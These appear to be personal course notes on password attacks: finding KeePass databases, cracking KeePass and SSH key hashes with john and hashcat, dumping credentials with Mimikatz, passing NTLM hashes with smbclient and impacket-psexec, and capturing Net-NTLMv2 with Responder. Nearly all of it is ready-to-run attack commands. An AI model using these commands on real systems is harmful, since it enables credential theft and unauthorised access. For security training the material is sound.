## Section 2 Password Cracking Fundamentals
### 15.2.4 Password Manager
- Command to find keepass kdbx files:
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- Cracking with keepass with john
		1. Get the kdbx file and remove "Database." string from the firstline
```
keepass2john <FILE> keepass.hash
```
```
hashcat --help | grep -i "keepass"
```
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
### 15.2.5 SSH Private Key Passphrase
- Cracking ssh id_rsa file
```
chmod 600 id_rsa
```
```
ssh2john id_rsa > ssh.hash 
```
```
hashcat -h | grep -i "ssh"
```
- Remove the leading strings/characters in the hash file and run hashcat OR make sure the following is at the top of the ssh.rule file first
```
[List.Rules:sshRules]
```
- Add ssh rules to john.conf with 
```
sudo sh -c 'cat <HASHCAT_RULE_FILE> >> /etc/john/john.conf'
```
- Crack it with john
```
john --wordlist=<WORDLIST> --rules <RULES> <HASHFILE>
```
## Section 3 Working with Password Hashes
### 15.3.1 Cracking NTLM
- Good rule for NTLM
```
hashcat -m 1000 <HASHFILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
- Mimikatz commands to get SeDebugPrivilege access rights enabled use 
```
privilege::debug
```
- Extract plaintext passwords with password hashes from all available sources with 
```
sekurlsa::logonpasswords
```
- Extract NTLM hashes from the SAM with BUT FIRST USE the following to elevate to SYSTEM user privileges
```
token::elevate
```
```
lsadump::sam
```
### 15.3.2 Passing NTLM
- Pass the hash with smbclient 
```
smbclient \\\\IP\\SHARE -U <USERNAME> --pw-nt-hash <HASH>
```
- PsExec with impacket and NTLM_V1
```
impacket-psexec -hashes 00000000000000000000000000000000:<HASH> <USERNAME>@<IP>
```
### 15.3.3 Cracking Net-NTLM_V2
- Responder can capture authentication handshakes and NTLM hashes
	- To run it you have to specify the interface with the following to capture and print the hash for you to crack or use when you try to use SMB or another vector to connect
```
sudo responder -l <INTERFACE>
```
- Vector to connect with the following from a target where you have a command shell
```
dir \\<IP>\secrets
```
## Exercises To-Do

- [ ] 2.1.1 (page 20)